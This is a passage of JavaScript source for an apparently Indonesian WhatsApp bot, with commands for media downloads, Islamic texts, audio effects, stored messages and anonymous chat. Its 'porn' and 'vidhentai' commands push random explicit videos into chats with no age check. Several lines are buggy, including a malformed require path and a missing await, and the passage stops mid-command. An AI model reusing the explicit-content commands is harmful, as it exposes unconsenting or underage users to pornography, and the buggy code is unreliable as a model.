					alfa.sendFileUrl(m.chat, anu.media[0].url, `Download Url Instagram From ${isUrl(text)[0]}`, m)
				}
			}
			break
			case 'joox': case 'jooxdl': {
			if (!m.isGroup) throw man.gcwa
				if (!text) throw 'No Query Title'
				fakey(wet)
				let anu = await fetchJson(api('lol', '/downloader/joox', { query: text }, 'apikey'))
				let msg = await alfa.sendImage(m.chat, anu.result.img, `➤ Title : ${anu.result.lagu}\n➤ Album : ${anu.result.album}\n➤ Singer : ${anu.result.penyanyi}\n➤ Publish : ${anu.result.publish}\n➤ Lirik :\n${anu.result.lirik.result}`, m)
				alfa.sendMessage(m.chat, { audio: { url: anu.result.mp4aLink }, mimetype: 'audio/mp4', fileName: anu.result.lagu+'.m4a' }, { quoted: msg })
			}
			break
			case 'soundcloud': case 'scdl': {
			if (!m.isGroup) throw man.gcwa
				if (!text) throw 'No Query Title'
				fakey(wet)
				let anu = await fetchJson(api('lol', '/downloader/soundcloud', { url: isUrl(text)[0] }, 'apikey'))
				let msg = await alfa.sendImage(m.chat, anu.result.thumb, `➤ Title : ${anu.result.title}\n➤ Url : ${isUrl(text)[0]}`)
				alfa.sendMessage(m.chat, { audio: { url: anu.result.url }, mimetype: 'audio/mp4', fileName: anu.result.title+'.m4a' }, { quoted: msg })
			}
			break
			case 'twitdl': case 'twitter': {
			if (!m.isGroup) throw man.gcwa
				if (!text) throw '*「LINK NYA MANA ?」*'
				fakey(wet)
				let anu = await fetchJson(api('lol', '/api/downloader/twitter', { url: text }, 'apikey'))
				let buttons = [
					{buttonId: `twittermp3 ${text}`, buttonText: {displayText: '► Audio'}, type: 1}
				]
				let buttonMessage = {
					video: { url: anu.result.HD || anu.result.SD },
					caption: util.format(anu.result),
					footer: 'Press The Button Below',
					buttons: buttons,
					headerType: 5
				}
				alfa.sendMessage(m.chat, buttonMessage, { quoted: m })
			}
			break
			case 'twittermp3': case 'twitteraudio': {
			if (!m.isGroup) throw man.gcwa
				if (!text) throw '*「LINK NYA MANA ?」*'
				fakey(wet)
				let anu = await fetchJson(api('lol', '/api/downloader/twitter', { url: text }, 'apikey'))
				let buttons = [
					{buttonId: `twitter ${text}`, buttonText: {displayText: '► Video'}, type: 1}
				]
				let buttonMessage = {
			image: { url: anu.result.thumb },
					caption: util.format(anu.result),
					footer: 'Press The Button Below',
					buttons: buttons,
					headerType: 4
				}
				let msg = await alfa.sendMessage(m.chat, buttonMessage, { quoted: m })
				alfa.sendMessage(m.chat, { audio: { url: anu.result.audio } }, { quoted: msg })
			}
			break
			case 'fbdl': case 'fb': case 'facebook': {
			if (!m.isGroup) throw man.gcwa
				if (!text) throw '*「LINK NYA MANA ?」*'
				fakey(wet)
				let anu = await fetchJson(api('lol', '/api/downloader/facebook', { url: text }, 'apikey'))
				alfa.sendMessage(m.chat, { video: { url: anu.result.url }, caption: `➤ Title : ${anu.result.title}`}, { quoted: m })
			}
			break
			case 'pindl': case 'pinterestdl': {
			if (!m.isGroup) throw man.gcwa
				if (!text) throw '*「LINK NYA MANA ?」*'
				fakey(wet)
				let anu = await fetchJson(api('lol', '/api/downloader/pinterestdl', { url: text }, 'apikey'))
				alfa.sendMessage(m.chat, { video: { url: anu.result }, caption: `Download From ${text}` }, { quoted: m })
			}
			break
			case 'umma': case 'ummadl': {
			if (!text) throw `Example : ${prefix + command} https://umma.id/channel/video/post/gus-arafat-sumber-kecewa-84464612933698`
				let { umma } = require('./lib) scraper')
		let anu = await umma(isUrl(text)[0])
		if (anu.type == 'video') {
			let buttons = [
						{buttonId: `ytmp3 ${anu.media[0]} 128kbps`, buttonText: {displayText: '♫ Audio'}, type: 1},
						{buttonId: `ytmp4 ${anu.media[0]} 360p`, buttonText: {displayText: '► Video'}, type: 1}
					]
			let buttonMessage = {
				image: { url: anu.author.profilePic },
			caption: `
➤ Title : ${anu.title}
➤ Author : ${anu.author.name}
➤ Like : ${anu.like}
➤ Caption : ${anu.caption}
➤ Url : ${anu.media[0]}
Untuk Download Media Silahkan Klik salah satu Button dibawah ini atau masukkan command ytmp3/ytmp4 dengan url diatas
`,
			footer: alfa.user.name,
			buttons,
			headerType: 4
			}
			alfa.sendMessage(m.chat, buttonMessage, { quoted: m })
		} else if (anu.type == 'image') {
			anu.media.map(async (url) => {
				alfa.sendMessage(m.chat, { image: { url }, caption: `➤ Title : ${anu.title}\n➤ Author : ${anu.author.name}\n➤ Like : ${anu.like}\n➤ Caption : ${anu.caption}` }, { quoted: m })
			})
		}
		}
		break
case 'porn': {
let { porno } = require('./lib/scraper2')
let anj = await porno ()
let result = anj[Math.floor(Math.random() * anj.length)]
alfa.sendMessage(m.chat, {video: result.video, caption: `Title: ${result.title}`}, m)
}
break
case 'vidhentai': {
let { hentai } = require('./lib/scraper2')
let anj = await hentai ()
let result = anj[Math.floor(Math.random() * anj.length)]
alfa.sendMessage(m.chat, {video: result.video_1, caption: `Title: ${result.title}`}, m)
}
break
		case 'ringtone': {
		if (!text) throw `Example : ${prefix + command} black rover`
		let { ringtone } = require('./lib/scraper')
		let anu = await ringtone(text)
		let result = anu[Math.floor(Math.random() * anu.length)]
		alfa.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mp4' }, { quoted: m })
		}
		break
		case 'iqra': {
		oh = `Example : ${prefix + command} 3\n\nIQRA Yang tersedia : 1,2,3,4,5,6`
		if (!text) throw oh
		yy = await getBuffer(`https://islamic-api-indonesia.herokuapp.com/api/data/pdf/iqra${text}`)
		alfa.sendMessage(m.chat, {document: yy, mimetype: 'application/pdf', fileName: `iqra${text}.pdf`}, {quoted:m}).catch ((err) => m.reply(oh))
		}
		break
		case 'juzamma': {
		if (args[0] === 'pdf') {
		fakey(wet)
		alfa.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.pdf'}, mimetype: 'application/pdf', fileName: 'juz-amma-arab-latin-indonesia.pdf'}, {quoted:m})
		} else if (args[0] === 'docx') {
		fakey(wet)
		alfa.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.docx'}, mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document', fileName: 'juz-amma-arab-latin-indonesia.docx'}, {quoted:m})
		} else if (args[0] === 'pptx') {
		fakey(wet)
		alfa.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.pptx'}, mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation', fileName: 'juz-amma-arab-latin-indonesia.pptx'}, {quoted:m})
		} else if (args[0] === 'xlsx') {
		fakey(wet)
		alfa.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.xlsx'}, mimetype: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', fileName: 'juz-amma-arab-latin-indonesia.xlsx'}, {quoted:m})
		} else {
		m.reply(`Mau format apa ? Example : ${prefix + command} pdf

Format yang tersedia : pdf, docx, pptx, xlsx`)
		}
		}
		break
		case 'hadis': case 'hadist': {
		if (!args[0]) throw `Contoh:
${prefix + command} bukhari 1
${prefix + command} abu-daud 1

Pilihan tersedia:
abu-daud
1 - 4590
ahmad
1 - 26363
bukhari
1 - 7008
darimi
1 - 3367
ibnu-majah
1 - 4331
nasai
1 - 5662
malik
1 - 1594
muslim
1 - 5362`
		if (!args[1]) throw `Hadis yang ke berapa?\n\ncontoh:\n${prefix + command} muslim 1`
		try {
		let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/json/hadith/${args[0]}`)
		let { number, arab, id } = res.find(v => v.number == args[1])
		m.reply(`No. ${number}

${arab}

${id}`)
		} catch (e) {
		m.reply(`Hadis tidak ditemukan !`)
		}
		}
		break
		case 'alquran': {
		if (!args[0]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah surah Al-Fatihah ayat 2 beserta audionya, dan ayatnya 1 aja`
		if (!args[1]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah surah Al-Fatihah ayat 2 beserta audionya, dan ayatnya 1 aja`
		let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/quran?surah=${args[0]}&ayat=${args[1]}`)
		let txt = `*Arab* : ${res.result.data.text.arab}
*English* : ${res.result.data.translation.en}
*Indonesia* : ${res.result.data.translation.id}

( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
		m.reply(txt)
		alfa.sendMessage(m.chat, {audio: { url: res.result.data.audio.primary }, mimetype: 'audio/mp4'}, { quoted : m })
		}
		break
		case 'tafsirsurah': {
		if (!args[0]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`
		if (!args[1]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`
		let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/quran?surah=${args[0]}&ayat=${args[1]}`)
		let txt = `「 *Tafsir Surah*  」

*Pendek* : ${res.result.data.tafsir.id.short}

*Panjang* : ${res.result.data.tafsir.id.long}

( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
		m.reply(txt)
		}
		break
		   case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'tupai':
				try {
				let set
				if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
				if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
				if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
				if (/earrape/.test(command)) set = '-af volume=12'
				if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
				if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
				if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
				if (/reverse/.test(command)) set = '-filter_complex "areverse"'
				if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
				if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
				if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
				if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
				if (/audio/.test(mime)) {
				fakey(wet)
				let media = await alfa.downloadAndSaveMediaMessage(quoted)
				let ran = getRandom('.mp3')
				exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
				fs.unlinkSync(media)
				if (err) return m.reply(err)
				let buff = fs.readFileSync(ran)
				alfa.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mp4' }, { quoted : m })
				fs.unlinkSync(ran)
				})
				} else m.reply(`Balas audio yang ingin diubah dengan caption *${prefix + command}*`)
				} catch (e) {
				m.reply(e)
				}
				break
			case 'setcmd': {
				if (!m.quoted) throw '*「 TAG PESAN NYA 」*'
				if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
				if (!text) throw `Untuk Command Apa?`
				let hash = m.quoted.fileSha256.toString('base64')
				if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to change this sticker command'
				global.db.data.sticker[hash] = {
					text,
					mentionedJid: m.mentionedJid,
					creator: m.sender,
					at: + new Date,
					locked: false,
				}
				m.reply(`Done!`)
			}
			break
			case 'delcmd': {
				let hash = m.quoted.fileSha256.toString('base64')
				if (!hash) throw `Tidak ada hash`
				if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to delete this sticker command'			  
				delete global.db.data.sticker[hash]
				m.reply(`Done!`)
			}
			break
			case 'listcmd': {
				let teks = `
*List Hash*
Info: *bold* hash is Locked
${Object.entries(global.db.data.sticker).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`).join('\n')}
`.trim()
				alfa.sendText(m.chat, teks, m, { mentions: Object.values(global.db.data.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
			}
			break
			case 'lockcmd': {
				if (!isCreator) throw man.kus
				if (!m.quoted) throw '*「 TAG PESAN NYA 」*'
				if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
				let hash = m.quoted.fileSha256.toString('base64')
				if (!(hash in global.db.data.sticker)) throw 'Hash not found in database'
				global.db.data.sticker[hash].locked = !/^un/i.test(command)
				m.reply('Done!')
			}
			break
			case 'addmsg': {
				if (!m.quoted) throw '*「 TAG PESAN NYA 」*'
				if (!text) throw `Example : ${prefix + command} nama file`
				let msgs = global.db.data.database
				if (text.toLowerCase() in msgs) throw `'${text}' telah terdaftar di list pesan`
				msgs[text.toLowerCase()] = quoted.fakeObj
m.reply(`Berhasil menambahkan pesan di list pesan sebagai '${text}'
	
Akses dengan ${prefix}getmsg ${text}

Lihat list Pesan Dengan ${prefix}listmsg`)
			}
			break
			case 'getmsg': {
				if (!text) throw `Example : ${prefix + command} file name\n\nLihat list pesan dengan ${prefix}listmsg`
				let msgs = global.db.data.database
				if (!(text.toLowerCase() in msgs)) throw `'${text}' tidak terdaftar di list pesan`
				alfa.copyNForward(m.chat, msgs[text.toLowerCase()], true)
			}
			break
			case 'listmsg': {
				let msgs = JSON.parse(fs.readFileSync('./src/database.json'))
			let seplit = Object.entries(global.db.data.database).map(([nama, isi]) => { return { nama, ...isi } })
		let teks = '「 LIST DATABASE 」\n\n'
		for (let i of seplit) {
			teks += `⬡ *Name :* ${i.nama}\n⬡ *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
			}
			m.reply(teks)
		}
		break
			case 'delmsg': case 'deletemsg': {
			let msgs = global.db.data.database
			if (!(text.toLowerCase() in msgs)) return m.reply(`'${text}' tidak terdaftar didalam list pesan`)
		delete msgs[text.toLowerCase()]
		m.reply(`Berhasil menghapus '${text}' dari list pesan`)
			}
		break
		case 'anonymous': {
				if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
				this.anonymous = this.anonymous ? this.anonymous : {}
				let buttons = [
					{ buttonId: 'start', buttonText: { displayText: 'Start' }, type: 1 }
				]
				alfa.sendButtonText(m.chat, buttons, `\`\`\`Hi ${await alfa.getName(m.sender)} Welcome To Anonymous Chat\n\nKlik Button Dibawah Ini Untuk Mencari Partner\`\`\``, alfa.user.name, m)
			}
			break
			case 'keluar': case 'leave': {
				if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
				this.anonymous = this.anonymous ? this.anonymous : {}
				let room = Object.values(this.anonymous).find(room => room.check(m.sender))
				if (!room) {
					let buttons = [
						{ buttonId: 'start', buttonText: { displayText: 'Start' }, type: 1 }
					]
					await alfa.sendButtonText(m.chat, buttons, `\`\`\`Kamu Sedang Tidak Berada Di Sesi Anonymous, Tekan Button Untuk Mencari Partner \`\`\``)
					throw false
				}
				m.reply('Ok')
				let other = room.other(m.sender)
				if (other) await alfa.sendText(other, `\`\`\`Partner Telah Meninggalkan Sesi Anonymous\`\`\``, m)
				delete this.anonymous[room.id]
				if (command === 'leave') break
			}
			case 'mulai': case 'start': {
				if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
				this.anonymous = this.anonymous ? this.anonymous : {}
				if (Object.values(this.anonymous).find(room => room.check(m.sender))) {
					let buttons = [
						{ buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
					]
					await alfa.sendButtonText(m.chat, buttons, `\`\`\`Kamu Masih Berada Di dalam Sesi Anonymous, Tekan Button Dibawah Ini Untuk Menghentikan Sesi Anonymous Anda\`\`\``, alfa.user.name, m)
					throw false
				}
				let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
				if (room) {
					let buttons = [
						{ buttonId: 'next', buttonText: { displayText: 'Skip' }, type: 1 },
						{ buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
					]
					await alfa.sendButtonText(room.a, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, alfa.user.name, m)
					room.b = m.sender
					room.state = 'CHATTING'
					await alfa.sendButtonText(room.b, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, alfa.user.name, m)
				} else {
					let id = + new Date
					this.anonymous[id] = {
						id,
						a: m.sender,
						b: '',
						state: 'WAITING',
						check: function (who = '') {
							return [this.a, this.b].includes(who)
						},
						other: function (who = '') {
							return who === this.a ? this.b : who === this.b ? this.a : ''
						},
					}
					let buttons = [
						{ buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
					]
					await alfa.sendButtonText(m.chat, buttons, `\`\`\`Mohon Tunggu Sedang Mencari Partner\`\`\``, alfa.user.name, m)
				}
				break
			}
			case 'next': case 'lanjut': {
				if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
				this.anonymous = this.anonymous ? this.anonymous : {}
				let romeo = Object.values(this.anonymous).find(room => room.check(m.sender))
				if (!romeo) {
					let buttons = [
						{ buttonId: 'start', buttonText: { displayText: 'Start' }, type: 1 }
					]
					await alfa.sendButtonText(m.chat, buttons, `\`\`\`Kamu Sedang Tidak Berada Di Sesi Anonymous, Tekan Button Untuk Mencari Partner\`\`\``)
					throw false
				}
				let other = romeo.other(m.sender)
				if (other) await alfa.sendText(other, `\`\`\`Partner Telah Meninggalkan Sesi Anonymous\`\`\``, m)
				delete this.anonymous[romeo.id]
				let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
				if (room) {
					let buttons = [
						{ buttonId: 'next', buttonText: { displayText: 'Skip' }, type: 1 },
						{ buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
					]
					await alfa.sendButtonText(room.a, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, alfa.user.name, m)
					room.b = m.sender
					room.state = 'CHATTING'
					await alfa.sendButtonText(room.b, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, alfa.user.name, m)
				} else {
					let id = + new Date
					this.anonymous[id] = {
						id,
						a: m.sender,
						b: '',
						state: 'WAITING',
						check: function (who = '') {
							return [this.a, this.b].includes(who)
						},
						other: function (who = '') {
							return who === this.a ? this.b : who === this.b ? this.a : ''
						},
					}
					let buttons = [
						{ buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
					]
					await alfa.sendButtonText(m.chat, buttons, `\`\`\`Mohon Tunggu Sedang Mencari Partner\`\`\``, alfa.user.name, m)
				}
				break
			}
			case 'public': {
				if (!isCreator) throw man.kus
				alfa.public = true
				m.reply('Sukse Change To Public Usage')
			}
			break
			case 'self': {
				if (!isCreator) throw man.kus
				alfa.public = false
				m.reply('Sukses Change To Self Usage')
			}
			break
			case 'ping': case 'botstatus': case 'statusbot': {
				const used = process.memoryUsage()
				const cpus = os.cpus().map(cpu => {
					cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
					return cpu
				})
				const cpu = cpus.reduce((last, cpu, _, { length }) => {
					last.total += cpu.total
					last.speed += cpu.speed / length
					last.times.user += cpu.times.user
					last.times.nice += cpu.times.nice
					last.times.sys += cpu.times.sys
					last.times.idle += cpu.times.idle
					last.times.irq += cpu.times.irq
					return last
				}, {
					speed: 0,
					total: 0,
					times: {
						user: 0,
						nice: 0,
						sys: 0,
						idle: 0,
						irq: 0
				}
				})
				let timestamp = speed()
				let latensi = speed() - timestamp
				neww = performance.now()
				oldd = performance.now()
				respon = `
Kecepatan Respon ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
				`.trim()
				fakey(respon)
			}
			break
			case 'speedtest': {
			fakey(wet)
			let cp = require('child_process')
			let { promisify } = require('util')
			let exec = promisify(cp.exec).bind(cp)
		  let o
		  try {
		  o = await exec('python speed.py')
		  } catch (e) {
		  o = e
		 } finally {
		let { stdout, stderr } = o
		if (stdout.trim()) m.reply(stdout)
		if (stderr.trim()) m.reply(stderr)
			}
			}
			break
			case 'owner': case 'creator': {
				var an = alfa.sendContact(m.chat, global.own, m)
				alfa.sendMessage(m.chat, { text: `Itu Owner Ku Kk ${pushname} Jangan Di Spam Yah >_<`}, { quoted: an })
			}
			break
			case 'playstore': {
			if (!text) throw `Example : ${prefix + command} clash of clans`
			let res = await fetchJson(api('lol', '/webzone/playstore', { query: text }, 'apikey'))
			let teks = `➤ Playstore Search From : ${text}\n\n`
			for (let i of res.result) {
			teks += `➤ Name : ${i.name}\n`
			teks += `➤ Link : ${i.link}\n`
			teks += `➤ Developer : ${i.developer}\n`
			teks += `➤ Link Developer : ${i.link_dev}\n\n──────────────────────\n`
			}
			m.reply(teks)
			}
			break
			case 'gsmarena': {
			if (!text) throw `Example : ${prefix + command} samsung`
			let res = await fetchJson(api('lol', '/webzone/gsmarena', { query: text }, 'apikey'))
			let { judul, rilis, thumb, ukuran, type, storage, display, inchi, pixel, videoPixel, ram, chipset, batrai, merek_batre, detail } = res.result
let capt = `➤ Title: ${judul}
➤ Realease: ${rilis}
➤ Size: ${ukuran}
➤ Type: ${type}
➤ Storage: ${storage}
➤ Display: ${display}
➤ Inchi: ${inchi}
➤ Pixel: ${pixel}
➤ Video Pixel: ${videoPixel}
➤ Ram: ${ram}
➤ Chipset: ${chipset}
➤ Battery: ${batrai}
➤ Battery Brand: ${merek_batre}
➤ Detail: ${detail}`
			alfa.sendImage(m.chat, thumb, capt, m)
			}
			break
			case 'jadwalbioskop': {
			if (!text) throw `Example: ${prefix + command} jakarta`
			let res = await fetchJson(api('lol', '/webzone/jadwalbioskop', { kota: text }, 'apikey'))
			let capt = `Jadwal Bioskop From : ${text}\n\n`
			for (let i of res.result){
			capt += `➤ Title: ${i.title}\n`
			capt += `➤ Thumbnail: ${i.thumb}\n`
			capt += `➤ Url: ${i.url}\n\n──────────────────────\n`
			}
			alfa.sendImage(m.chat, res.result[0].thumb, capt, m)
			}
			break
			case 'nowplayingbioskop': {
			let res = await fetchJson(api('lol', '/webzone/nowplayingbioskop', {}, 'apikey'))
			let capt = `Now Playing Bioskop\n\n`
			for (let i of res.result){
			capt += `➤ Title: ${i.title}\n`
			capt += `➤ Url: ${i.url}\n`
			capt += `➤ Img Url: ${i.img}\n\n──────────────────────\n`
			}
			alfa.sendImage(m.chat, res.result[0].img, capt, m)
			}
			break
			case 'aminio': {
			if (!text) throw `Example: ${prefix + command} free fire`
			let res = await fetchJson(api('lol', '/webzone/amino', { query: text }, 'apikey'))
			let capt = `Amino Search From : ${text}\n\n`
			for (let i of res.result){
			capt += `➤ Community: ${i.community}\n`
			capt += `➤ Community Link: ${i.community_link}\n`
			capt += `➤ Thumbnail: ${i.community_thumb}\n`
			capt += `➤ Description: ${i.community_desc}\n`
			capt += `➤ Member Count: ${i.member_count}\n\n──────────────────────\n`
			}
			alfa.sendImage(m.chat, 'https://'+res.result[0].community_thumb, capt, m)
			}
			break
			case 'wattpad': {
			if (!text) throw `Example : ${prefix + command} love`
			let res = await fetchJson(api('lol', '/webzone/wattpad', { query: text }, 'apikey'))
			let { judul, dibaca, divote, bab, waktu, url, thumb, description } = res.result[0]
			let capt = `Wattpad From ${text}\n\n`
			capt += `➤ Judul: ${judul}\n`
			capt += `➤ Dibaca: ${dibaca}\n`
			capt += `➤ Divote: ${divote}\n`
			capt += `➤ Bab: ${bab}\n`
			capt += `➤ Waktu: ${waktu}\n`
			capt += `➤ Url: ${url}\n`
			capt += `➤ Deskripsi: ${description}`
			alfa.sendImage(m.chat, thumb, capt, m)
			}
			break
			case 'webtoons': {
			if (!text) throw `Example : ${prefix + command} love`
			let res = await fetchJson(api('lol', '/webzone/webtoons', { query: text }, 'apikey'))
			let capt = `Webtoons Search From : ${text}\n\n`
			for (let i of res.result) {
			capt += `➤ Judul: ${i.judul}\n`
			capt += `➤ Like: ${i.like}\n`
			capt += `➤ Creator: ${i.creator}\n`
			capt += `➤ Genre: ${i.genre}\n`
			capt += `➤ Url: ${i.url}\n\n──────────────────────\n`
			}
			m.reply(capt)
			}
			break
			case 'drakor': {
			if (!text) throw `Example : ${prefix + command} love`
			let res = await fetchJson(api('lol', '/webzone/drakor', { query: text }, 'apikey'))
			let capt = `Drakor Search From : ${text}\n\n`
			for (let i of res.result) {
			capt += `➤ Judul: ${i.judul}\n`
			capt += `➤ Years: ${i.years}\n`
			capt += `➤ Genre: ${i.genre}\n`
			capt += `➤ Url: ${i.url}\n`
			capt += `➤ Thumbnail Url: ${i.thumbnail}\n\n──────────────────────\n`
			}
			alfa.sendImage(m.chat, res.result[0].thumbnail, capt, m)
			}
			break
			case 'setmenu': {
			if (!isCreator) throw man.kus
			let setbot = db.data.settings[botNumber]
			   if (args[0] === 'templateImage'){
				setbot.templateImage = true
				setbot.templateVideo = false
				setbot.templateGif = false
				setbot.templateMsg = false
				m.reply(mess.success)
				} else if (args[0] === 'templateVideo'){
				setbot.templateImage = false
				setbot.templateVideo = true
				setbot.templateGif = false
				setbot.templateMsg = false
				m.reply(mess.success)
				} else if (args[0] === 'templateGif'){
				setbot.templateImage = false
				setbot.templateVideo = false
				setbot.templateGif = true
				setbot.templateMsg = false
				m.reply(mess.success)
				} else if (args[0] === 'templateMessage'){
				setbot.templateImage = false
				setbot.templateVideo = false
				setbot.templateGif = false
				setbot.templateMsg = true
				m.reply(mess.success)
				} else {
				let sections = [
				{
				title: "CHANGE MENU BOT",
				rows: [
				{title: "Template Image", rowId: `setmenu templateImage`, description: `Change menu bot to Template Image`},
				{title: "Template Video", rowId: `setmenu templateVideo`, description: `Change menu bot to Template Video`},
				{title: "Template Gif", rowId: `setmenu templateGif`, description: `Change menu bot to Template Gif`},
				{title: "Template Message", rowId: `setmenu templateMessage`, description: `Change menu bot to Template Message`}
				]
				},
				]
				alfa.sendListMsg(m.chat, `Please select the menu you want to change!`, alfa.user.name, `Hello Owner !`, `Click Here`, sections, m)
				}
			}
			break
case 'sdk': {
anu = `➤ 1.*JANGAN TELPON BOT/DI BLOKIR*\n➤ 2.*JANGAN SPAM/TELPON/VC OWNER KALO GA MAU DI BLOKIR*\n➤ 3.*JANGAN CHAT OWNER ANEH²*\n➤ 4.*OWNER TIDAK MELAYANI SV KONTAK, KALO LU BLUM PERKENALKAN DIRI LU*\n\n ${sdkm}`
let btn = [{
								urlButton: {
									displayText: 'My Owner 🖤',
									url: 'https://wa.me/62895397918020'
								}
							}, {
								urlButton: {
									displayText: 'My Github 🔥',
									url: 'https://www.github.com/ManzTzy1'
								}
							}, {
								quickReplyButton: {
									displayText: 'Thanks To 📌',
									id: 'thx'
								}
							}, {
								quickReplyButton: {
									displayText: 'Script Bot',
									id: 'sc'
								}
							}, {
								quickReplyButton: {
									displayText: 'Back To Menu',
									id: 'allmenu'
								}
							}]
							sdk = fs.readFileSync('./lib/sdk.jpg')
alfa.send5ButImg(m.chat, anu, global.copy, sdk, btn)
}
break

case 'aseli': {
if (!text) throw '_*Contoh kusonime High school dxd*_!'
anj = axios.get(`https://melcanz.com/kusonime?query=${text}&apikey=melcantik`)
let reso = anj.result[Math.floor(Math.random() * anj.result.length)]
let link = reso.list[Math.floor(Math.random() * reso.list.length)]
alfa.sendMessage(m.chat, { image: { url: anj.result.thumbs }, caption: `➤ Title: ${anj.result.title}\n➤ Title Japanese: ${anj.result.title_jp}\n➤ Genre: ${anj.result.genre}\n➤ Season: ${anj.result.season}\n➤ Producer: ${anj.result.producer}\n➤ Type: ${anj.result.type}\n➤ Status: ${anj.result.status}\n➤ Total Episode: ${anj.result.total_episode}\n➤ Rating: ${anj.result.score}\n➤ Duration: ${anj.result.duration}\n➤ Realse: ${anj.result.released_on}\n➤ Description: ${anj.result.description}\n\nLink Download:\n➤ Resolution: ${reso.resolution}\n➤ Link: ${link.download_link} Download Via: ${link.downloader}`, fileLength: "100000000000000000", footer: global.copy }, { quoted: m })
			}
			break
case prefix+'storyanime': 

  fakey(mess.wait)
var swanime = JSON.parse(fs.readFileSync('./random/swanime.json'))
var hasil = pickRandom(swanime)
var quot = [
			{ quickReplyButton: { displayText: `Next`, id: `${command}` } },
			{ quickReplyButton: { displayText: `Donasi 💌`, id: `${couple}` } },
			]
		alfa.sendMessage(m.chat, {caption: `${hasil.title}`, video: {url: hasil.result}, templateButtons: quot, footer: `Di Upload Pada: ${hasil.date}`}, { quoted: m } )
		break
case prefix+'bocil': 
  
  fakey(mess.wait)
var bocil = JSON.parse(fs.readFileSync('./random/bocil.json'))
var hasil = pickRandom(bocil)
var quot = [
